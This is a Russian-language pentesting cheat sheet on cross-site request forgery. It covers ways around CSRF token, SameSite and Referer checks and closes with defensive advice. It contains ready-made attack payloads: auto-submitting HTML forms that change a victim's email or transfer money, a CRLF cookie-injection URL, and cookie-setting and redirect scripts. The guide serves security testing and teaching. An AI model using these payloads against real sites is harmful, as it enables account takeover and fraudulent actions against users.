# **CSRF(client)**

> CSRF — Cross-Site Request Forgery, подделка межсайтовых запросов. Уязвимость, при которой злоумышленник может незаметно заставить жертву выполнить нежелательные действия в веб-приложении, где она уже аутентифицирована.

## Условия для CSRF-атаки

* **Авторизационный токен хранится в куки.**
> На клиентской стороне есть три хранилища данных: куки, `localStorage` и `sessionStorage`. Сайты по-разному распределяют данные между ними. Авторизационный токен обычно хранят в куках, реже — в `localStorage`, почти никогда — в `sessionStorage`. Только куки браузер автоматически прикладывает к запросам.

* **Есть действие, которое интересно злоумышленнику.**
> Это любое действие, которое изменяет состояние сервера и может принести выгоду. Например, смена пароля или почты, отправка сообщения, денежный перевод.

* **Данные в запросе передаются в простом формате.**
> Условие связано с CORS — это механизм безопасности браузера, который регулирует запросы ресурсов с одного домена на другой. Если формат данных сложный, то и сам запрос сложный. Сложные запросы браузер не пропустит без OPTIONS — предварительного запроса для проверки разрешения на запрос с другого домена. По умолчанию считаем, что CORS на атакуемом сайте не настроен. Значит, запрос до него не дойдёт, и атака не сорвётся.

* **Сервер не ждёт в запросе энтропийный параметр, который неизвестен злоумышленнику.**
> Энтропийный параметр — это CSRF-токен. Это случайное значение, которое сложно угадать или забрутфорсить. Сервер использует его для аутентификации наравне с авторизационным токеном. Самая эффективная защита от CSRF.

# **Как тестировать**

- Проверь, где хранится CSRF-токен. Если он хранится в куки, приложение уязвимо.
- Выполни запрос с неверным CSRF-токеном — замени символ в своём токене. Иногда разработчики не проверяют его валидность.
- Отправь запрос без CSRF-токена. Приложения не всегда проверяют его наличие.
- Подставь в запрос валидный токен другого пользователя. Достаточно подставить в PoC свой собственный CSRF-токен. Если токен не привязан к сессии пользователя, сервис выполнит такой запрос.
- Если в запросе сложный формат данных, замени его на простой. Высока вероятность, что сервер некорректно обрабатывает тип данных. Тогда запрос завершится успешно.
```
    application/x-www-form-urlencoded
    multipart/form-data
    text/plain
```
- Другие запросы, которые могут заинтересовать. Возможно, в них нет CSRF-токена. Обратить внимание и на GET-запросы.

# Обход проверки CSRF-токена

> **CSRF-токен** — это уникальное, секретное и непредсказуемое значение, которое генерируется серверным приложением и передается клиенту. При отправке запроса на выполнение конфиденциального действия, например, отправку формы, клиент должен указать правильный CSRF-токен. В противном случае сервер откажется выполнить запрошенное действие.

Распространенный способ передачи CSRF-токенов клиенту — включение их в качестве скрытого параметра в HTML-форму.
```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

### **Валидация CSRF-токена зависит от метода запроса**
	* Некоторые приложения корректно проверяют токен при использовании метода POST в запросе, но пропускают валидацию при использовании метода GET.
```
<form action="https://victimsite.net/my-account/change-email">
    <input type="hidden" name="email" value="a1e00e00b7@mail.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
### **Валидация CSRF-токена зависит от наличия токена**
* Некоторые приложения корректно проверяют токен при его наличии, но пропускают валидацию, если токен отсутствует.
### **CSRF-токен не привязан к сеансу пользователя**
* Некоторые приложения не проверяют принадлежность токена к тому же сеансу, что и пользователь, выполняющий запрос. Вместо этого приложение поддерживает глобальный пул выпущенных им токенов и принимает любые токены из этого пула.
* менять не сам токен в запросе, а сессионную куки.
### **CSRF-токен привязан к несеансовому cookie-файлу**
* В одном из вариантов предыдущей уязвимости некоторые приложения привязывают CSRF-токен к cookie-файлу, но не к тому, который используется для отслеживания сеансов. Это может легко произойти, когда приложение использует два разных фреймворка, один для обработки сеанса, а другой для защиты от CSRF-атак, которые не интегрированы друг с другом.
* Если на веб-сайте есть какое-либо поведение, позволяющее установить cookie-файл в браузере цели, то атака возможна.
  * войти в приложение, используя свою учётную запись,
  * получить действительный токен и связанный с ним cookie-файл,
  * использовать механизм установки cookie-файлов для размещения своего cookie-файла в браузере цели и передать свой токен в ходе CSRF-атаки.
```
<html>
<body>
<form action="https://target-site.net/my-account/change-email" method="POST">
   <input type="hidden" name="email" value="anaaayt@web-academy.net">
   <input type="hidden" name="csrf" value="5leGMq3x1hvmoWYQjeUYphFXWFHvwc9I">
   <input type="submit" value="Submit request">
</form>
<img src="https://target-site.net/?search=test%0d%0aSet-Cookie:%20csrfKey=UaLmYw9A6hhiv2xtHQqwApCPl7mhux9L%3b%20SameSite=None" onerror="document.forms[0].submit()">
</body>
</html>
```

> Функция установки cookie-файлов не обязательно должна существовать в том же веб-приложении, что и уязвимость CSRF. Любое другое приложение в том же DNS-домене потенциально может быть использовано для установки cookie-файлов в атакуемом приложении, если контролируемый cookie-файл имеет подходящую область действия.

### **CSRF-токен просто дублируется в cookie-файле**

* Naive Double Submit Cookie — CSRF-токен отправляют в одном запросе дважды. Первый раз в куки, второй — в качестве параметра или заголовка запроса.
	* Пользователь отправляет запрос, сайт добавляет в него CSRF-токен. 
	* Браузер, прикладывает к запросу куки, в которой хранится такой же токен.
	* Сервер получает два токена и сравнивает их между собой. Если значения совпадают, запрос считается легитимным. 
	* Если не совпадают — сервер отклоняет запрос.
> Уязвимость: CSRF-токен не привязан к сессии пользователя.

* XSS на поддомене
```
<script>document.cookie = "csrf_token=f12fa086-3655-425a-8c82-86d7c815c021;
Path=/submit; domain=example.com";</script> 
```
* CRLF-атака
```
%0d%0aSet-Cookie:%20csrfKey=UaLmYw9A6hhiv2xhux9L%3b%20SameSite=None
```
* Naive Double Submit Cookie и CORS 
> Если токен пересылают в заголовке запроса, возникнут дополнительные трудности. Можно воспользоваться этими двумя уязвимостями, только если на сервере неправильно настроен CORS.

# Обход ограничений файлов cookie SameSite

> SameSite — это механизм безопасности браузера, который определяет, включаются ли файлы cookie веб-сайта в запросы, исходящие с других веб-сайтов.
### Значения `SameSite`
- `None`: браузер отправляет куки с любым запросом — вне зависимости от его источника. Это используют в основном для межсайтовой навигации.
- `Strict`: куки отправляют, только если сайт, которому предназначен запрос, совпадает с сайтом, который указан в адресной строке. К межсайтовым запросам куки не добавляют.
- `Lax`: куки добавляют к запросам, которые инициированы тем же сайтом; и в некоторых других случаях — например, если переход по ссылке на другой домен использует метод GET.
Если у куки значение `SameSite` не установлено:
- браузер будет обрабатывать её как куки со значением `Lax`,
- в первые 120 секунд все ограничения игнорируются.

### **Обход нестрогих ограничений SameSite с помощью GET-запросов**

> На практике серверы не всегда придирчивы к тому, какой запрос они получают к заданной конечной точке — GET или POST, даже те, которые ожидают отправки формы.

* Если запрос включает навигацию верхнего уровня, браузер всё равно включит сеансовый cookie-файл
```
  <script>document.location = 'https://vctim-site.net/my-account/change-email?email=new@mail.my&_method=POST';</script>
```
* Некоторые фреймворки предоставляют способы переопределения метода, указанного в строке запроса. Например, параметр _method в формах, который имеет приоритет над обычным методом при маршрутизации:
```
<form action="https://victim-website.com/account/transfer-payment" method="POST">
<input type="hidden" name="_method" value="GET">
<input type="hidden" name="recipient" value="hacker">
<input type="hidden" name="amount" value="1000000">
</form>
```
### **Обход ограничений SameSite с помощью redirect**

* Если cookie установлен с атрибутом SameSite=Strict, браузеры не будут включать его в межсайтовые запросы. Обойти это ограничение можно, если найти точку, которая приводит к вторичному запросу в пределах того же сайта.
```
<script>
document.location = "https://0a3500d004b1724880ae03e7001b00fc.web-security-academy.net/post/comment/confirmation?postId=7/../../my-account/change-email?email=pwned@web-security-academy.net%26submit=1";
</script>
```
> Атака невозможна при серверном перенаправлении. В этом случае браузеры распознают, что запрос на перенаправление изначально был результатом межсайтового запроса

### **Обход ограничений SameSite через уязвимые родственные домены**

### **Обход нестрогих ограничений SameSite с помощью новых файлов cookie**

# **Обход защиты CSRF на основе Referer**

> HTTP-заголовок Referer — это необязательный заголовок запроса, содержащий URL-адрес веб-страницы, ссылающейся на запрашиваемый ресурс.

### **Проверка Referer зависит от наличия заголовка**

Некоторые приложения проверяют заголовок Referer, если он присутствует в запросах, но пропускают проверку, если заголовок отсутствует.
```
<meta name="referrer" content="never">
```
### **Обоход валидации Referer**

* Если приложение проверяет, что домен в Referer начинается с ожидаемого значения:
```
http://website.com.attacker-website.com/csrf-attack
```
* Если приложение проверяет, что Referer содержит его собственное доменное имя:
```
http://website.com/csrf-attack?vulnerable-website.com
```
* Если строка запроса из заголовка Referer удаляется:
```
Referrer-Policy: unsafe-url 
```
* Метод для обновления URL в адресной строке без обновления страницы:
```
<script> 
       history.pushState("", "", "/?0aa700ca04c849eb801621f5006500ea.web-security-academy.net")
</script>
```

# **Последствия**
- Захват аккаунта в приложениях с возможностью управления деньгами.
- Захват аккаунта с критичными персональными данными.
- Подделка запроса на выполнение критичного действия — например, перевода денег.
	
# **Защита**

### Использование CSRF-токенов

* Токен должен соответствовать следующим критериям:
	* Непредсказуемость и высокая энтропия, как и для сессионных токенов в целом.
	* Привязка к сеансу пользователя.
	* Строго проверяться в каждом случае перед выполнением соответствующего действия.
	* CSRF-токены должны обладать значительной энтропией и быть строго непредсказуемыми, обладая теми же свойствами, что и сессионные токены в целом.
	* Следует использовать криптографически стойкий генератор псевдослучайных чисел (CSPRNG), начальное значение которого содержит метку времени создания и статический секрет.
* CSRF-токены не следует передавать в файлах cookie.
* Как следует проверять CSRF-токены:
	* Сгенерированный CSRF-токен должен храниться на сервере в данных сеанса пользователя.
 	* Проверка должна выполняться независимо от HTTP-метода или типа содержимого запроса
* Устанавливать собственные ограничения SameSite для каждого создаваемого файла cookie.

# URL

- https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie
- https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
